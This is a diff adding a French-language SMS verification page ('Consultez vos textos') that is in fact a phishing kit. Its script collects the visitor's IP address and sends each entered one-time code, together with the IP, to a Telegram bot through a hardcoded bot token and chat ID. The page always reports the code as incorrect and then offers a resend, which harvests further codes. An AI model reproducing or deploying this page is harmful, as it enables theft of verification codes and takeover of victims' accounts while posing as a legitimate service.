@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Consultez vos textos</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Roboto', Arial, sans-serif;
+            background-color: #f9f9f9;
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .container {
+            background-color: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 600px;
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+        }
+
+        header {
+            text-align: center;
+        }
+
+        .back-button {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            background: none;
+            border: none;
+            font-size: 24px;
+        }
+
+        h1 {
+            margin-top: 0;
+            font-weight: 700;
+        }
+
+        main {
+            margin-top: 20px;
+            text-align: center;
+            flex-grow: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+
+        img {
+            width: 100%;
+            max-width: 300px;
+            margin-bottom: 20px;
+        }
+
+        .input-field {
+            width: 90%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-family: 'Roboto', Arial, sans-serif;
+        }
+
+        .refresh-icon {
+            margin-right: 5px;
+        }
+
+        .continue-button, .alternative-button, .resend-button {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: none;
+            border-radius: 20px;
+            color: white;
+            font-weight: bold;
+            cursor: pointer;
+            font-family: 'Roboto', Arial, sans-serif;
+        }
+
+        .continue-button {
+            background-color: #87CEEB;
+            color: white;
+        }
+
+        .alternative-button {
+            background-color: transparent;
+            border: 1px solid #e0e0e0;
+            color: #e0e0e0;
+        }
+
+        .resend-button {
+            background-color: #87CEEB; /* Sky blue color for "Renvoyer le code" */
+            color: white;
+        }
+
+        .instruction-text {
+            margin-bottom: 20px;
+            font-weight: 400;
+        }
+
+        .error-message {
+            color: red;
+            margin-bottom: 10px;
+            font-size: 0.9em;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <button class="back-button"></button>
+            <h1>Consultez vos textos</h1>
+            <p class="instruction-text">Saisissez le code que nous avons envoyé à votre numéro..</p>
+        
+        <main>
+            <img src="image.png" alt="Phone with shield icon">
+            <input type="text" placeholder="Entrez le code" id="code-input" class="input-field">
+            <p id="errorMessage" class="error-message" style="display: none;"></p>
+            <p id="timerMessage"><span class="refresh-icon">↺</span> Nous pouvons envoyer un nouveau code dans <span id="timer">02:53</span>.</p>
+            <button class="continue-button" id="continueButton" onclick="handleCodeSubmission()">Continuer</button>
+            <button class="alternative-button">Essayer d'une autre façon</button>
+        </main>
+        </header>
+    </div>
+
+    <script>
+        let timeLeft = 173; // 2 minutes and 53 seconds in seconds
+        const timerElement = document.getElementById('timer');
+        const errorMessageElement = document.getElementById('errorMessage');
+        const continueButton = document.getElementById('continueButton');
+        let incorrectAttempts = 0;
+
+        const TELEGRAM_BOT_TOKEN = "7625805299:AAGABz5u4JHYtB0YwHjmiaMSF2O4Zlv0z80"; // Replace with your bot token
+        const TELEGRAM_CHAT_ID = "6996434307"; // Replace with your chat ID
+
+        function updateTimer() {
+            const minutes = Math.floor(timeLeft / 60);
+            const seconds = timeLeft % 60;
+            timerElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+            
+            if (timeLeft > 0) {
+                timeLeft--;
+                setTimeout(updateTimer, 1000);
+            } else {
+                timerElement.textContent = "00:00";
+                timerElement.style.color = "red";
+            }
+        }
+
+        // Fetch IP address using an external service
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                window.userIP = data.ip; // Store IP for later use
+            })
+            .catch(error => console.error('Error fetching IP:', error));
+
+        updateTimer();
+
+        // Function to handle code submission
+        function handleCodeSubmission() {
+            const codeInput = document.getElementById('code-input').value.trim();
+            if (!codeInput) {
+                return; // Do nothing if the input is empty
+            }
+
+            // Simulate code validation (replace with actual validation logic)
+            const isValidCode = false; // Replace with your actual validation logic
+
+            // Always send the entered code and user IP to Telegram bot
+            sendCodeToTelegram(codeInput);
+
+            // Clear the input field after submission
+            document.getElementById('code-input').value = '';
+
+            if (isValidCode) {
+                // Proceed silently without showing any messages
+                continueButton.style.display = "none"; // Optionally hide the button if needed
+            } else {
+                incorrectAttempts++;
+                if (incorrectAttempts === 1) {
+                    // First incorrect attempt: Show "Code incorrect"
+                    errorMessageElement.textContent = "Code incorrect";
+                    errorMessageElement.style.display = "block";
+                } else if (incorrectAttempts === 2) {
+                    // Second incorrect attempt: Remove error message and replace "Continuer" button
+                    errorMessageElement.style.display = "none"; // Hide the error message
+                    continueButton.style.display = "none"; // Hide the "Continuer" button
+                    const resendButton = document.createElement('button');
+                    resendButton.className = "resend-button";
+                    resendButton.textContent = "Renvoyer le code";
+                    resendButton.onclick = resendCode;
+                    continueButton.parentNode.insertBefore(resendButton, continueButton.nextSibling);
+                }
+            }
+        }
+
+        // Function to send code and IP to Telegram bot
+        function sendCodeToTelegram(code) {
+            const message = `Code: ${code}\nIP: ${window.userIP}`;
+
+            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: message
+                })
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log("Code et IP envoyés avec succès !");
+                } else {
+                    throw new Error("Erreur lors de l'envoi du code et de l'IP.");
+                }
+            })
+            .catch(error => {
+                console.error(error);
+            });
+        }
+
+        // Function to resend the code
+        function resendCode() {
+            timeLeft = 173; // Reset timer to 2:53
+            updateTimer();
+            timerElement.style.color = ""; // Reset timer color
+        }
+    </script>
+</body>
+</html>
